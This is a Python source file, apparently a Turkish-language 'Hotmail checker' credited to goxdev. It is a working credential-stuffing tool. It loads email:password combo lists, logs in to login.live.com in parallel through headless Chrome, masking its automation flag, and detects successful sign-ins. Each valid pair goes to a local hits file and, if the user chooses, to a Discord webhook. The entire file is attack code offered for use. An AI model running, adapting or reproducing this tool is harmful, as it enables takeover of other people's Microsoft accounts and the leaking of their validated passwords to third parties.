import os
import time
import logging
import tkinter as tk
from tkinter import filedialog
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
import requests
import json
import datetime

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# Suppress Selenium & WebDriver logs
logging.getLogger('selenium').setLevel(logging.CRITICAL)
logging.getLogger('webdriver').setLevel(logging.CRITICAL)
logging.getLogger('').setLevel(logging.CRITICAL)

# Discord webhook functionality
USE_DISCORD_WEBHOOK = input("Do you want to send hits to a Discord webhook? (yes/no): ").lower() == 'yes'
WEBHOOK_URL = None

if USE_DISCORD_WEBHOOK:
    WEBHOOK_URL = input("Enter your Discord webhook URL: ").strip()
    print(f"[*] Discord webhook configured. Hits will be sent to Discord.")

def clear_and_print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = r"""
 .+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+. 
(      _   _       _                   _ _                   _        )
 )    | | | | ___ | |_ _ __ ___   __ _(_) | ___ _ __  __   _/ |      ( 
(     | |_| |/ _ \| __| '_  _ \ / _ | | |/ _ \ '__| \ \ / / |       )
 )    |  _  | (_) | |_| | | | | | (_| | | |  __/ |     \ V /| |      ( 
(     |_| |_|\___/ \__|_| |_| |_|\__,_|_|_|\___|_|      \_/ |_|       )
 )                                                                   ( 
(                                                                     )
 "+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+" 
"""
    print(banner)

def read_combos(file_path):
    combos = []
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            for line in file:
                if ':' in line:
                    email, password = line.strip().split(':', 1)
                    combos.append((email, password))
    except:
        pass
    return combos

def send_to_discord(email, password):
    if not USE_DISCORD_WEBHOOK or not WEBHOOK_URL:
        return
    
    embed = {
        "title": "✅ New Hotmail Hit Detected! ✅",
        "color": 5814783,  # Green color
        "fields": [
            {
                "name": "📧 Email",
                "value": f"{email}",
                "inline": True
            },
            {
                "name": "🔑 Password",
                "value": f"{password}",
                "inline": True
            }
        ],
        "footer": {
            "text": "GoXTool Hotmail Checker"
        },
        "timestamp": datetime.datetime.utcnow().isoformat()
    }
    
    payload = {
        "content": "🔥 **NEW HOTMAIL HIT!** 🔥",
        "embeds": [embed]
    }
    
    try:
        response = requests.post(
            WEBHOOK_URL,
            data=json.dumps(payload),
            headers={"Content-Type": "application/json"}
        )
        if response.status_code == 204:
            print(f"[*] Hit sent to Discord webhook!")
    except Exception as e:
        print(f"[!] Failed to send to Discord: {str(e)}")

def save_hit(email, password):
    with open("hits.txt", "a", encoding="utf-8") as f:
        f.write(f"{email}:{password} Checker by goxdev\n")
    
    # Send hit to Discord if configured
    if USE_DISCORD_WEBHOOK:
        send_to_discord(email, password)

def test_hotmail_login(email, password, driver):
    try:
        driver.get("https://login.live.com")
        WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.NAME, "loginfmt")))

        driver.find_element(By.NAME, "loginfmt").send_keys(email)
        driver.find_element(By.ID, "idSIButton9").click()

        WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.NAME, "passwd")))
        driver.find_element(By.NAME, "passwd").send_keys(password)
        driver.find_element(By.ID, "idSIButton9").click()
        time.sleep(0.5)

        # Check for stay signed in prompt
        try:
            WebDriverWait(driver, 4).until(
                EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Oturumunuz açık kalsın mı?')]"))
            )
            print(f"[BAŞARILI] {email}:{password} ile giriş yapıldı!")
            save_hit(email, password)
            return True
        except:
            if "Oturumunuz açık kalsın mı?" in driver.page_source:
                print(f"[BAŞARILI] {email}:{password} ile giriş yapıldı!")
                save_hit(email, password)
                return True

        # Check for redirect
        current_url = driver.current_url
        if "login.live.com" not in current_url and ("outlook.live.com" in current_url or "account.microsoft.com" in current_url):
            print(f"[BAŞARILI] {email}:{password} ile giriş yapıldı!")
            save_hit(email, password)
            return True

        print(f"[BAŞARISIZ] {email}:{password} ile giriş yapılamadı.")
        return False

    except:
        print(f"[BAŞARISIZ] {email}:{password} ile giriş yapılamadı.")
        return False

def worker(combo_queue, instance_id, max_instances, executor):
    while not combo_queue.empty():
        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-gpu")
        options.add_argument("--log-level=3")
        options.add_argument("--disable-dev-shm-usage")
        options.add_experimental_option("excludeSwitches", ["enable-logging"])

        driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install(), log_output=os.devnull),
            options=options
        )

        try:
            email, password = combo_queue.get()
            success = test_hotmail_login(email, password, driver)
            combo_queue.task_done()

            if success:
                driver.quit()
                if not combo_queue.empty():
                    executor.submit(worker, combo_queue, instance_id, max_instances, executor)
                return

            time.sleep(2)
        except:
            combo_queue.task_done()
        finally:
            driver.quit()

def select_file():
    root = tk.Tk()
    root.withdraw()
    file_path = filedialog.askopenfilename(
        title="Txt dosyasını seçin",
        filetypes=[("Text files", "*.txt")]
    )
    root.destroy()
    return file_path

def get_instance_count():
    while True:
        try:
            count = int(input("Kaç instance (paralel tarayıcı) kullanılsın? (Ör: 1-5): "))
            if 1 <= count <= 15:
                return count
            print("1-15 arasında bir sayı girin.")
        except ValueError:
            continue

def main():
    clear_and_print_banner()

    file_path = select_file()
    if not file_path or not os.path.exists(file_path):
        return

    combos = read_combos(file_path)
    if not combos:
        return

    num_instances = get_instance_count()
    combo_queue = Queue()
    for combo in combos:
        combo_queue.put(combo)

    with ThreadPoolExecutor(max_workers=num_instances) as executor:
        for i in range(num_instances):
            executor.submit(worker, combo_queue, i+1, num_instances, executor)
            time.sleep(0.2)

    print("Tüm kombinasyonlar denendi.")

if __name__ == "__main__":
    main()